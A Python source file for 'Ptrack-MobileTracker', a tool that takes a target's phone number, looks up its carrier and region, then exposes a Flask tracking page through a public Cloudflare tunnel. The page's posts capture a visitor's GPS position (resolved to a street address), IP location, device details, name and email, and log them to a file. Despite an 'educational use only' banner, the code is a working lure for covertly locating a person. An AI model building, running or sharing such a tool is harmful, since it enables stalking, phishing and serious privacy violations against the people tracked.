# Ptrack-MobileTracker
import sys
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from flask import Flask, request, render_template
import requests
import webbrowser
from geopy.geocoders import Nominatim
from datetime import datetime
import subprocess
import threading
import time
import socket
import os
from colorama import Fore, Style, init, Back

# Initialize Colorama
init(autoreset=True)

# ========== Constants ==========
VERSION = "2.1.0"
AUTHOR = "Purple Ranger"
CONTACT = "purplehub@aol.com"
WHATSAPP = "https://wa.link/nhd7st"
SITE = "https://purplehub.serveo.net"

# ========== Banner ==========
def show_banner():
    """Display the colorful application banner"""
    print(Fore.MAGENTA + r"""
      ██████╗ ████████╗██████╗  █████╗  ██████╗██╗  ██╗
      ██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
      ██████╔╝   ██║   ██████╔╝███████║██║     █████╔╝ 
      ██╔═══╝    ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ 
      ██║        ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗
      ╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """ + Style.RESET_ALL)

    print(Fore.YELLOW + Style.BRIGHT + "      Mobile Intelligence & Location Tracker")
    print(Fore.CYAN + "      Version: " + Fore.GREEN + VERSION)
    print(Fore.CYAN + "      Author:  " + Fore.GREEN + AUTHOR)
    print(Fore.CYAN + "      Contact: " + Fore.GREEN + CONTACT)
    print(Fore.CYAN + "      WhatsApp: " + Fore.GREEN + WHATSAPP)
    print(Fore.CYAN + "      Site: " + Fore.GREEN + SITE)


    print("\n" + Fore.WHITE + Back.RED + "⚠️ LEGAL DISCLAIMER: FOR EDUCATIONAL USE ONLY ⚠️" + Style.RESET_ALL)
    print(Fore.RED + "• Obtain EXPLICIT CONSENT before use")
    print(Fore.RED + "• Misuse may violate privacy laws")
    print(Fore.RED + "• Developer assumes NO LIABILITY for misuse\n")

# ========== Phone Intelligence ==========
def validate_phone_number(phone_number):
    """Validate and parse phone number"""
    try:
        phone_number = phone_number.strip()
        if not (phone_number.startswith('+') or phone_number.startswith('00')):
            raise ValueError("Phone number must include country code (e.g., +14155552671)")
        
        parsed_number = phonenumbers.parse(phone_number)
        if not phonenumbers.is_valid_number(parsed_number):
            raise ValueError("Invalid phone number format")
            
        return parsed_number
    except Exception as e:
        print(Fore.RED + f"❌ Error: {str(e)}" + Style.RESET_ALL)
        sys.exit(1)

def get_phone_info(parsed_number):
    """Extract detailed phone number information"""
    info = {
        "Number": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
        "Region": geocoder.description_for_number(parsed_number, 'en'),
        "Carrier": carrier.name_for_number(parsed_number, 'en'),
        "Timezone": ", ".join(timezone.time_zones_for_number(parsed_number)),
        "Valid": phonenumbers.is_valid_number(parsed_number),
        "Possible": phonenumbers.is_possible_number(parsed_number),
        "E164 Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164),
        "National Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL)
    }
    return info

def display_phone_info(info):
    """Display phone information with colorful formatting"""
    print(Fore.CYAN + "\n📱 Phone Number Intelligence Report:")
    print(Fore.YELLOW + "═" * 50)
    for key, value in info.items():
        print(Fore.CYAN + f"{key:>15}: " + Fore.GREEN + f"{value}")
    print(Fore.YELLOW + "═" * 50 + "\n")

# ========== Location Services ==========
def get_ip_geolocation(ip):
    """Get approximate location from IP address"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        return f"{data.get('city', 'Unknown')}, {data.get('regionName', 'Unknown')}, {data.get('country', 'Unknown')}"
    except Exception:
        return "Location unavailable"

def get_gps_location(lat, lon, acc):
    """Get precise location from GPS coordinates"""
    try:
        geolocator = Nominatim(user_agent="ptrack_app")
        location = geolocator.reverse((lat, lon), exactly_one=True)
        return {
            "address": location.address,
            "map_url": f"https://www.google.com/maps?q={lat},{lon}",
            "accuracy": f"{acc} meters"
        }
    except Exception:
        return None

# ========== Web Server ==========
app = Flask(__name__)

@app.route('/')
def index():
    """Render the tracking page"""
    return render_template("index.html")

@app.route('/location', methods=['POST'])
def track():
    """Handle tracking data from client"""
    data = request.get_json()
    ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry_type = data.get("type")  # gps, ip, or user_info

    log_entry = {
        "timestamp": timestamp,
        "ip": ip,
        "type": entry_type,
    }

    if entry_type in ["gps", "ip"]:
        location_data = process_location_data(data, ip)
        device_info = data.get("device_info", {})
        log_entry["location"] = location_data
        log_entry["device_info"] = device_info

        print(Fore.GREEN + "\n🛰️ Location/Device Info Collected:")
        print(Fore.YELLOW + "═" * 50)
        print(Fore.CYAN + f"🕒 Time: {timestamp}")
        print(Fore.CYAN + f"🌐 IP: {ip}")
        print(Fore.CYAN + location_data["message"])
        print(Fore.CYAN + "\n📱 Device Info:")
        for key, value in device_info.items():
            print(f"   {key}: {value}")
        print(Fore.YELLOW + "═" * 50)

    elif entry_type == "user_info":
        user_info = data.get("user_info", {})
        log_entry["user_info"] = user_info

        print(Fore.MAGENTA + "\n👤 User Submitted Info:")
        print(Fore.YELLOW + "═" * 50)
        print(Fore.CYAN + f"🕒 Time: {timestamp}")
        print(Fore.CYAN + f"🌐 IP: {ip}")
        print(Fore.CYAN + f"👤 Name: {user_info.get('name', 'N/A')}")
        print(Fore.CYAN + f"📧 Email: {user_info.get('email', 'N/A')}")
        print(Fore.YELLOW + "═" * 50)

    else:
        print(Fore.RED + "❌ Unknown data type received.")
        return '', 400

    # Log to file
    with open("visitor_logs.txt", "a") as f:
        f.write(str(log_entry) + "\n")

    return '', 204


def process_location_data(data, ip):
    """Process and return location information"""
    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("acc", 0)
    gps_denied = data.get("gps_denied", False)
    
    if not gps_denied and lat and lon:
        location = get_gps_location(lat, lon, acc)
        if location:
            return {
                "type": "GPS",
                "data": location,
                "message": f"📍 GPS Location: {location['address']} (Accuracy: {location['accuracy']})"
            }
    
    return {
        "type": "IP",
        "data": get_ip_geolocation(ip),
        "message": f"🌍 IP-based Location: {get_ip_geolocation(ip)}"
    }

def log_visit(timestamp, ip, device_info, location_data):
    """Log visitor information to console and file"""
    log_entry = {
        "timestamp": timestamp,
        "ip": ip,
        "location": location_data,
        "device": device_info
    }
    
    # Console output
    print(Fore.GREEN + "\n🆕 New Visitor Report:")
    print(Fore.YELLOW + "═" * 50)
    print(Fore.CYAN + f"🕒 Time: {timestamp}")
    print(Fore.CYAN + f"🌐 IP: {ip}")
    print(Fore.CYAN + location_data["message"])
    print(Fore.CYAN + "\n📱 Device Info:")
    for key, value in device_info.items():
        print(f"   {key}: {value}")
    print(Fore.YELLOW + "═" * 50)
    
    # File logging
    with open("visitor_logs.txt", "a") as f:
        f.write(f"{log_entry}\n")

# ========== Cloudflare Tunnel ==========
def start_cloudflare_tunnel():
    """Start Cloudflare tunnel for public access"""
    try:
        print(Fore.BLUE + "\n☁️  Initializing Cloudflare Tunnel..." + Style.RESET_ALL)
        
        tunnel = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        
        # Monitor tunnel output in separate thread
        threading.Thread(target=monitor_tunnel, args=(tunnel,), daemon=True).start()
        return tunnel
    except FileNotFoundError:
        print(Fore.RED + "❌ Error: cloudflared not installed. Get it from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/")
        return None

def monitor_tunnel(tunnel_process):
    """Monitor tunnel process output for URL"""
    while True:
        output = tunnel_process.stdout.readline()
        if output == '' and tunnel_process.poll() is not None:
            break
        if output:
            print(Fore.BLUE + "  " + output.strip())
            if "trycloudflare.com" in output:
                url = output.strip().split()[-1]
                print(Fore.GREEN + f"\n🌐 Public URL: {url}\n")

# ========== Main Application ==========
def main():
    """Main application entry point"""
    try:
        show_banner()
        
        # Validate phone number argument
        if len(sys.argv) < 2:
            print(Fore.RED + "Usage: python ptrack.py +1234567890")
            sys.exit(1)
            
        phone_number = sys.argv[1]
        parsed_number = validate_phone_number(phone_number)
        phone_info = get_phone_info(parsed_number)
        display_phone_info(phone_info)
        
        # Start network services
        tunnel = start_cloudflare_tunnel()
        time.sleep(2)  # Give tunnel time to initialize
        
        print(Fore.GREEN + "🚀 Starting server on http://localhost:5000")
        webbrowser.open("http://localhost:5000")
        
        # Start Flask server
        app.run(host='0.0.0.0', port=5000)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n🛑 Shutting down Ptrack-MobileTracker...")
        if tunnel:
            tunnel.terminate()
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"❌ Critical error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
